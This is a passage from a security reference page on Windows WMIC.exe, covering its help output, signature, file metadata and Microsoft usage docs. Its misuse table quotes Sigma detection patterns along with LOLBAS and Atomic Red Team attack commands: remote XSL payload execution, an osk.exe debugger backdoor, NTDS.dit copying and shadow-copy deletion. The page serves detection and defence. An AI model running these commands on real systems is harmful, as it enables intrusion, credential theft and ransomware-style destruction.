+<span class="ni">VOLUMEQUOTASETTING</span>       <span class="err">-</span> <span class="ni">Associates</span> <span class="ni">the</span> <span class="ni">disk</span> <span class="ni">quota</span> <span class="ni">setting</span> <span class="ni">with</span> <span class="err">a</span> <span class="ni">specific</span> <span class="ni">disk</span> <span class="ni">volume</span><span class="err">.</span> 
+<span class="ni">VOLUMEUSERQUOTA</span>          <span class="err">-</span> <span class="ni">Per</span> <span class="ni">user</span> <span class="ni">storage</span> <span class="ni">volume</span> <span class="ni">quota</span> <span class="ni">management</span><span class="err">.</span>
+<span class="ni">WMISET</span>                   <span class="err">-</span> <span class="ni">WMI</span> <span class="ni">service</span> <span class="ni">operational</span> <span class="ni">parameters</span> <span class="ni">management</span><span class="err">.</span> 
+
+<span class="ni">For</span> <span class="ni">more</span> <span class="ni">information</span> <span class="ni">on</span> <span class="err">a</span> <span class="ni">specific</span> <span class="ni">alias</span><span class="p">,</span> <span class="kd">type:</span> <span class="ni">alias</span> <span class="p">/</span><span class="err">?</span>
+
+<span class="ni">CLASS</span>     <span class="err">-</span> <span class="ni">Escapes</span> <span class="ni">to</span> <span class="ni">full</span> <span class="ni">WMI</span> <span class="ni">schema</span><span class="err">.</span>
+<span class="ni">PATH</span>      <span class="err">-</span> <span class="ni">Escapes</span> <span class="ni">to</span> <span class="ni">full</span> <span class="ni">WMI</span> <span class="ni">object</span> <span class="ni">paths</span><span class="err">.</span>
+<span class="ni">CONTEXT</span>   <span class="err">-</span> <span class="ni">Displays</span> <span class="ni">the</span> <span class="ni">state</span> <span class="ni">of</span> <span class="ni">all</span> <span class="ni">the</span> <span class="ni">global</span> <span class="ni">switches</span><span class="err">.</span>
+<span class="ni">QUIT</span><span class="p">/</span><span class="ni">EXIT</span> <span class="err">-</span> <span class="ni">Exits</span> <span class="ni">the</span> <span class="ni">program</span><span class="err">.</span>
+
+<span class="ni">For</span> <span class="ni">more</span> <span class="ni">information</span> <span class="ni">on</span> <span class="ni">CLASS</span><span class="p">/</span><span class="ni">PATH</span><span class="p">/</span><span class="ni">CONTEXT</span><span class="p">,</span> <span class="kd">type:</span> <span class="p">(</span><span class="ni">CLASS</span> <span class="err">|</span> <span class="ni">PATH</span> <span class="err">|</span> <span class="ni">CONTEXT</span><span class="p">)</span> <span class="p">/</span><span class="err">?</span>
+
+
+</code></pre></div></div>
+
+<h3 id="usage-stderr">Usage (stderr):</h3>
+<div class="language-cmhg highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="ni">help</span> <span class="err">-</span> <span class="ni">Alias</span> <span class="ni">not</span> <span class="ni">found</span><span class="err">.</span>
+
+</code></pre></div></div>
+
+<h3 id="loaded-modules">Loaded Modules:</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Path</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>C:\Windows\System32\KERNEL32.DLL</td>
+    </tr>
+    <tr>
+      <td>C:\Windows\System32\KERNELBASE.dll</td>
+    </tr>
+    <tr>
+      <td>C:\Windows\SYSTEM32\ntdll.dll</td>
+    </tr>
+    <tr>
+      <td>C:\Windows\system32\wbem\WMIC.exe</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="signature">Signature</h2>
+
+<ul>
+  <li>Status: Signature verified.</li>
+  <li>Serial: <code class="language-plaintext highlighter-rouge">3300000266BD1580EFA75CD6D3000000000266</code></li>
+  <li>Thumbprint: <code class="language-plaintext highlighter-rouge">A4341B9FD50FB9964283220A36A1EF6F6FAA7840</code></li>
+  <li>Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US</li>
+  <li>Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US</li>
+</ul>
+
+<h2 id="file-metadata">File Metadata</h2>
+
+<ul>
+  <li>Original Filename: wmic.exe.mui</li>
+  <li>Product Name: Microsoft Windows Operating System</li>
+  <li>Company Name: Microsoft Corporation</li>
+  <li>File Version: 10.0.19041.1 (WinBuild.160101.0800)</li>
+  <li>Product Version: 10.0.19041.1</li>
+  <li>Language: English (United States)</li>
+  <li>Legal Copyright:  Microsoft Corporation. All rights reserved.</li>
+  <li>Machine Type: 64-bit</li>
+</ul>
+
+<h2 id="file-scan">File Scan</h2>
+
+<ul>
+  <li>VirusTotal Detections: 0/76</li>
+  <li>VirusTotal Link: https://www.virustotal.com/gui/file/fa78c88dac91fdf2eac736e6900ac1ec4ab7a388b8f77a23ffa7e80a4ad29f5a/detection</li>
+</ul>
+
+<h2 id="possible-misuse">Possible Misuse</h2>
+
+<p><em>The following table contains possible examples of <code class="language-plaintext highlighter-rouge">WMIC.exe</code> being misused. While <code class="language-plaintext highlighter-rouge">WMIC.exe</code> is <strong>not</strong> inherently malicious, its legitimate functionality can be abused for malicious purposes.</em></p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Source</th>
+      <th>Source File</th>
+      <th>Example</th>
+      <th>License</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/other/godmode_sigma_rule.yml">godmode_sigma_rule.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- '\wmic.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/image_load/sysmon_suspicious_dbghelp_dbgcore_load.yml">sysmon_suspicious_dbghelp_dbgcore_load.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- '\wmic.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/malware/win_mal_blue_mockingbird.yml">win_mal_blue_mockingbird.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">Image\|endswith: '\wmic.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_bypass_squiblytwo.yml">win_bypass_squiblytwo.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- '*\wmic.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_crime_maze_ransomware.yml">win_crime_maze_ransomware.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">Image\|endswith: '\wmic.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_html_help_spawn.yml">win_html_help_spawn.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- '\wmic.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_local_system_owner_account_discovery.yml">win_local_system_owner_account_discovery.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- Image\|endswith: '\wmic.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_office_shell.yml">win_office_shell.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- '*\wmic.exe'  # https://app.any.run/tasks/c903e9c8-0350-440c-8688-3881b556b8e0/</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_renamed_binary.yml">win_renamed_binary.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- 'wmic.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_renamed_binary.yml">win_renamed_binary.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- '\wmic.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_renamed_binary_highly_relevant.yml">win_renamed_binary_highly_relevant.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- "wmic.exe"</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_renamed_binary_highly_relevant.yml">win_renamed_binary_highly_relevant.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- '*\wmic.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_shadow_copies_creation.yml">win_shadow_copies_creation.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- '\wmic.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_shadow_copies_deletion.yml">win_shadow_copies_deletion.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- '\wmic.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_eventlog_clear.yml">win_susp_eventlog_clear.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">Image\|endswith: '\wmic.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_wmi_execution.yml">win_susp_wmi_execution.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- '*\wmic.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_xsl_script_processing.yml">win_xsl_script_processing.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- Image\|endswith: '\wmic.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_xsl_script_processing.yml">win_xsl_script_processing.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- WMIC.exe FP depend on scripts and administrative methods used in the monitored environment</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/Neo23x0/sigma">sigma</a></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/sysmon/sysmon_suspicious_remote_thread.yml">sysmon_suspicious_remote_thread.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- '\wmic.exe'</code></td>
+      <td><a href="https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md">DRL 1.0</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml">Wmic.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">Name: Wmic.exe</code></td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml">Wmic.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- Command: wmic.exe process call create "c:\ads\file.txt:program.exe"</code></td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml">Wmic.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- Command: wmic.exe process call create calc</code></td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml">Wmic.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- Command: wmic.exe process call create "C:\Windows\system32\reg.exe add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe\" /v \"Debugger\" /t REG_SZ /d \"cmd.exe\" /f"</code></td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml">Wmic.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- Command: wmic.exe /node:"192.168.0.1" process call create "evil.exe"</code></td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml">Wmic.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- Command: wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create "at 9:00PM c:\GoogleUpdate.exe ^&gt; c:\notGoogleUpdateResults.txt"</code></td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml">Wmic.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- Command: wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create "cmd /c vssadmin create shadow /for=C:\Windows\NTDS\NTDS.dit &gt; c:\not_the_NTDS.dit"</code></td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml">Wmic.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- Command: wmic.exe process get brief /format:"https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl"</code></td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml">Wmic.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- Command: wmic.exe process get brief /format:"\\127.0.0.1\c$\Tools\pocremote.xsl"</code></td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml">Wmic.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- Path: C:\Windows\System32\wbem\wmic.exe</code></td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS">LOLBAS</a></td>
+      <td><a href="https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml">Wmic.yml</a></td>
+      <td><code class="language-plaintext highlighter-rouge">- Path: C:\Windows\SysWOW64\wbem\wmic.exe</code></td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1047/T1047.md">T1047.md</a></td>
+      <td>This test uses wmic.exe to execute a process on the local host.</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1047/T1047.md">T1047.md</a></td>
+      <td>This test uses wmic.exe to execute a process on a remote host. Specify a valid value for remote IP using the node parameter.</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1220/T1220.md">T1220.md</a></td>
+      <td>| wmic_command | WMI command to execute using wmic.exe | string | process list|</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.md">T1490.md</a></td>
+      <td>wmic.exe shadowcopy delete</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team">atomic-red-team</a></td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1518.001/T1518.001.md">T1518.001.md</a></td>
+      <td>wmic.exe /Namespace:\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List</td>
+      <td><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt">MIT License. © 2018 Red Canary</a></td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="additional-info">Additional Info*</h2>
+
+<p><em>*The information below is copied from <a href="https://github.com/MicrosoftDocs/windowsserverdocs">MicrosoftDocs</a>, which is maintained by <a href="https://opensource.microsoft.com/codeofconduct/">Microsoft</a>. Available under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> license.</em></p>
+
+<hr />
+
+<h2 id="wmic">wmic</h2>
+
+<p>Displays WMI information inside an interactive command shell.</p>
+
+<h3 id="syntax">Syntax</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic &lt;/parameter&gt;
+</code></pre></div></div>
+
+<h3 id="sub-commands">Sub-commands</h3>
+
+<p>The following sub-commands are available at all times:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Sub-command</th>
+      <th>Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>class</td>
+      <td>Escapes from the default alias mode of WMIC to access classes in the WMI schema directly.</td>
+    </tr>
+    <tr>
+      <td>path</td>
+      <td>Escapes from the default alias mode of WMIC to access instances in the WMI schema directly.</td>
+    </tr>
+    <tr>
+      <td>context</td>
+      <td>Displays the current values of all global switches.</td>
+    </tr>
+    <tr>
+      <td>[quit | exit]</td>
+      <td>Exits the WMIC command shell.</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="examples">Examples</h3>
+
+<p>To display the current values of all global switches, type:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic context
+</code></pre></div></div>
+<p>Output similar to the following displays:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>NAMESPACE    : root\cimv2
+ROLE         : root\cli
+NODE(S)      : BOBENTERPRISE
+IMPLEVEL     : IMPERSONATE
+[AUTHORITY   : N/A]
+AUTHLEVEL    : PKTPRIVACY
+LOCALE       : ms_409
+PRIVILEGES   : ENABLE
+TRACE        : OFF
+RECORD       : N/A
+INTERACTIVE  : OFF
+FAILFAST     : OFF
+OUTPUT       : STDOUT
+APPEND       : STDOUT
+USER         : N/A
+AGGREGATE    : ON
+</code></pre></div></div>
+<p>To change the language ID used by the command line to English (locale ID 409), type:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic /locale:ms_409
+</code></pre></div></div>
+
+<h3 id="additional-references">Additional References</h3>
+
+<ul>
+  <li><a href="https://github.com/MicrosoftDocs/windowsserverdocs/tree/master/WindowsServerDocs/administration/windows-commands/command-line-syntax-key.md">Command-Line Syntax Key</a></li>
+</ul>
+
+<hr />
+
+<p>MIT License. Copyright (c) 2020 Strontic.</p>
+
+
+    </section>
+  </article>
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form onsubmit="return googleCustomSearchExecute();" id="cse-search-box-form-id">
+    <label class="sr-only" for="cse-search-input-box-id">
+      Enter your search term...
+    </label>
+    <input type="search" id="cse-search-input-box-id" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results">
+    <gcse:searchresults-only></gcse:searchresults-only>
+  </div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+          <li><a href="https://strontic.com" rel="nofollow noopener noreferrer"><i class="fab fa-blogger" aria-hidden="true"></i> strontic.com</a></li>
+        
+      
+        
+          <li><a href="https://twitter.com/strontic20" rel="nofollow noopener noreferrer"><i class="fab fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
+        
+      
+        
+          <li><a href="https://github.com/strontic" rel="nofollow noopener noreferrer"><i class="fab fa-github-square" aria-hidden="true"></i> GitHub</a></li>
+        
+      
+        
+          <li><a href="https://instagram.com/strontic20" rel="nofollow noopener noreferrer"><i class="fab fa-instagram-square" aria-hidden="true"></i> Instagram</a></li>
+        
+      
+        
+          <li><a href="https://www.linkedin.com/company/strontic" rel="nofollow noopener noreferrer"><i class="fab fa-linkedin" aria-hidden="true"></i> LinkedIn</a></li>
+        
+      
+        
+          <li><a href="https://www.facebook.com/strontic" rel="nofollow noopener noreferrer"><i class="fab fa-facebook-square" aria-hidden="true"></i> Facebook</a></li>
+        
+      
+        
+          <li><a href="mailto:info@strontic.com" rel="nofollow noopener noreferrer"><i class="fas fa-envelope-square" aria-hidden="true"></i> Email</a></li>
+        
+      
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2020 STRONTIC. Theme: <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+<script>
+  (function () {
+    var cx = '31f5caf6441fb12c8';
+    var gcse = document.createElement('script');
+    gcse.type = 'text/javascript';
+    gcse.async = true;
+    gcse.src = 'https://cse.google.com/cse.js?cx=' + cx;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(gcse, s);
+  })();
+
+  function googleCustomSearchExecute() {
+    var input = document.getElementById('cse-search-input-box-id');
+    var element = google.search.cse.element.getElement('searchresults-only0');
+    if (input.value == '') {
+      element.clearAllResults();
+    } else {
+      element.execute(input.value);
+    }
+    return false;
+  }
+
+  
+</script>
+
+
+
+
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-179392403-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-179392403-1', { 'anonymize_ip': true});
+</script>
+
+
+
+
+
+
+
+
+
+  </body>
+</html>
